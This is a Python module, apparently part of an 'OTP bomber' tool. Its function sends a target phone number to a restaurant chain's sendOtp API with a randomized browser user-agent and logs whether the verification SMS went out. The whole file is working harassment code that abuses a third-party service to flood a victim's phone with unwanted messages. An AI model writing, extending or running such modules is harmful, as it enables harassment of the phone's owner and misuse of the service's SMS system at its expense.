from otpbomber.core import *
from otpbomber.localuseragent import *

async def cheezious(phone, client, out):
    name = "cheezious"
    domain = "cheezious"
    frequent_rate_limit = False

    headers = {
        'user-agent': random.choice(ua["browsers"]["chrome"]),
    }
    json_data = {
    'phoneNo': str(phone),
    'otpType': 'new',
    }

    response = await client.post('https://api.cheezious.com/v1/customers/sendOtp', headers=headers, json=json_data)

    try:

        data = response.json()
        if data.get('isSuccess') == True:
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": True, "error": False})
        else:
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True})

    except Exception as e:
        print(f"Error: {e}")
        out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True})
